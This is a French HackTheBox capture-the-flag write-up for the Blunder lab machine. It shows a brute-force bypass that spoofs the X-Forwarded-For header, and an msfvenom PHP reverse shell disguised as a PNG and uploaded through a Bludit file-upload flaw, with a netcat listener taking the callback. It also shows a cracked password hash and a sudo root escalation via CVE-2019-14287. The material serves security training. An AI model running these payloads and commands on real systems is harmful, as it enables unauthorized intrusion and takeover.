---
title: HTB | Blunder
description: Blunder is an Easy difficulty Linux machine that features a Bludit CMS instance running on port 80. The website contains various facts about different genres. Using GoBuster, we identify a text file that hints to the existence of user fergus, as well as an admin login page that is protected against brute force. An exploit that bypasses the brute force protection is identified, and a dictionary attack is run against the login form. This attack grants us access to the admin panel as fergus. A GitHub issue detailing an arbitrary file upload and directory traversal vulnerability is identified, which is used to gain a shell as www-data. The system is enumerated and a newer version of the Bludit CMS is identified in the /var/www folder. The updated version contains the SHA1 hash of user hugo's password. The password can be cracked online, allowing us to move laterally to this user. Enumeration reveals that the user can run commands as any system user apart from root using sudo. The sudo binary is sudo is identified to be outdated, and vulnerable to CVE-2019-14287. Successful exploitation of this vulnerability returns a root shell.
slug: blunder-htb
date: 2025-02-13 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Blunder cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Blunder</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.191</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Enumeration

### nmap
```bash
$ nmap -sC -sV -An -T4 -vvv 10.10.10.191
PORT   STATE  SERVICE REASON       VERSION
21/tcp closed ftp     conn-refused
80/tcp open   http    syn-ack      Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
|_http-generator: Blunder
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: A0F0E5D852F0E3783AF700B6EE9D00DA
```

## Foothold

### Webserver : todo.txt
Sur le port 80, on trouve un serveur web. A la racine se trouve un fichier todo.txt avec des informations intéressantes.
```bash
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

### Bruteforce admin login page
On peut bruteforce la page admin avec l'utilisateur potentiel "fergus" qu'on a trouvé dans le todo.txt.
Il y  a une protection contre le bruteforce qui blacklist notre IP. Mais on peut changer le parametre "X_FORWADED_FOR: 127.0.0.1" avec une autre ip aléatoire et à nouveau effectuer de nouvelles tentatives d'authentification. Quelqu'un a déjà créer un script sur github en ruby pour effectuer cette attaque bruteforce facilement. On le trouve en utilisant searchsploit mais egalement sur internet:
https://github.com/noraj/Bludit-auth-BF-bypass

Pour la liste de mot de passe, le mot de passe ne semble pas etre dans la lite rockyou. Le reflexe est donc de créer une liste grâce à cewl et tous les mots présents sur la page d'accueil :
```bash
cewl http://10.10.10.191 > pass.txt
```
On peut maintenant effectuer notre attaque bruteforce avec notre script, l'utilisateur fergus ainsi que la liste de mot de passe basé sur les mots présents sur la page d'accueil du site web :
```bash
┌──(kali㉿kali)-[~/htb/Blunder]
└─$ ruby exploit.rb -r http://10.10.10.191 -u fergus -w ./pass.txt 
[*] Trying password: CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
[*] Trying password: the
...
...
[*] Trying password: book
[*] Trying password: collections
[*] Trying password: Bram
[*] Trying password: Stoker
[*] Trying password: British
[*] Trying password: Society
[*] Trying password: Book
[*] Trying password: Foundation
[*] Trying password: him
[*] Trying password: Distinguished
[*] Trying password: Contribution
[*] Trying password: Letters
[*] Trying password: probably
[*] Trying password: best
[*] Trying password: fictional
[*] Trying password: character
[*] Trying password: RolandDeschain

[+] Password found: RolandDeschain
```
On trouve les creds suivants :
fergus:`RolandDeschain`

### Directory Traversal
On trouve une exploit sur searchsploit permettant d'uploader une image png contenant du code php. Ici on générere avec msfvenom un reverseshell qu'on va uploader en tant qu'image png. Puis, on va pouvoir y accéder et executer le code en se rendant sur l'url:
/bl-content/tmp/temp/evil.png
```bash
#####################################################"
┌──(kali㉿kali)-[~/htb/Blunder]
└─$ msfvenom -p php/reverse_php LHOST=10.10.16.19 LPORT=1337 -f raw -b '"' > evil.png
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of php/base64
php/base64 succeeded with size 4051 (iteration=0)
php/base64 chosen with final size 4051
Payload size: 4051 bytes

┌──(kali㉿kali)-[~/htb/Blunder]
└─$ echo -e "<?php $(cat evil.png)" > evil.png

#######################################################

## Après le premier test, je n'arrivais pas a stabiliser mon shell
## J'ai donc utiliser un autre code php pour ouvrir un reverse shell

┌──(kali㉿kali)-[~/htb/Blunder]
└─$ cp php-reverse-shell.php evil.png

┌──(kali㉿kali)-[~/htb/Blunder]
└─$ cat evil.png                   
<?php eval(base64_decode('IoJG91dCkpOwogICAgICB......2xvc2UoJHMpOwogICAgfQo'));

┌──(kali㉿kali)-[~/htb/Blunder]
└─$ echo "RewriteEngine off" > .htaccess

┌──(kali㉿kali)-[~/htb/Blunder]
└─$ echo "AddType application/x-httpd-php .png" >> .htaccess

┌──(kali㉿kali)-[~/htb/Blunder]
└─$ python3 dir_traversal.py
cookie: qg5smk61bhamr0lg3t0s8n9mq5
csrf_token: 6325cd57b7d27ae4de54cefa8d79d6a7e15279d8
Uploading payload: evil.png
Uploading payload: .htaccess

----------------------------------------------------------------

┌──(kali㉿kali)-[~/htb/Blunder]
└─$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.16.19] from (UNKNOWN) [10.10.10.191] 36802
Linux blunder 5.3.0-53-generic #47-Ubuntu SMP Thu May 7 12:18:16 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 23:40:39 up 1 day,  7:09,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
shaun    :0       :0               Tue16   ?xdm?   8:54   0.00s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --systemd --session=ubuntu
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@blunder:/$ export TERM=xterm
export TERM=xterm
www-data@blunder:/$ ^Z
zsh: suspended  nc -lnvp 1337
               
┌──(kali㉿kali)-[~/htb/Blunder]
└─$ stty raw -echo; fg                                                          
[1]  + continued  nc -lnvp 1337

www-data@blunder:/$ whoami
www-data

```

### Getting Hugo user - user flag
En fouillant un peu dans les fichiers du serveur web, on trouve rapidement le mot de passe de hugo:
faca404fd5c0a31cf1897b823c695c85cffeb98d
Dans crackstation on obtient:
hugo : `Password120`

J'ai fait un grep de hugo car j'ai vu le nom de cet utilisant dans le dossier /home. De plus, hugo etait l'utilisateur contenant disposant du fichier user.txt.
```bash
www-data@blunder:/$ cd var
www-data@blunder:/var$ cd www
www-data@blunder:/var/www$ ls
bludit-3.10.0a  bludit-3.9.2  html
www-data@blunder:/var/www$ grep -rni hugo
bludit-3.10.0a/bl-content/databases/users.php:4:        "nickname": "Hugo",
bludit-3.10.0a/bl-content/databases/users.php:5:        "firstName": "Hugo",
www-data@blunder:/var/www$ cd bludit-3.10.0a/
www-data@blunder:/var/www/bludit-3.10.0a$ cd bl-content/
www-data@blunder:/var/www/bludit-3.10.0a/bl-content$ cd databases/
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ ls
categories.php  plugins       site.php    tags.php
pages.php       security.php  syslog.php  users.php
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php 
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su hugo
Password: 
hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cd 
hugo@blunder:~$ cat user.txt 
779f.....44d0
```

## Privilege Escalation

### CVE-2019-14287 : hugo -> root
On fait un sudo -l en tant que hugo:
```bash
exit
hugo@blunder:~$ sudo -l
Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```
On observe qu'il peut ouvrir un shell en tant que n'importe quel utilisateur, sauf root.

En cherchant un peu sur le web + chatGPT s'il est possible de bypasser cette restriction, on découvre une CVE:

**CVE-2019-14287** : Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv
-u#-1 returns as 0 which is root's id. (De même pour 4294967295 qui dépasse la limite d'un int ? Donne 0, donc l'id de root à nouveau ?)

and /bin/bash is executed with root permission

```bash
hugo@blunder:~$ sudo -u#-1 /bin/bash
root@blunder:/home/hugo# whoami
root
root@blunder:/home/hugo# cat /root/root.txt
99b9.....1d73

------------V2-------------
hugo@blunder:~$ sudo -u#4294967295 /bin/bash
root@blunder:/home/hugo# whoami
root
```
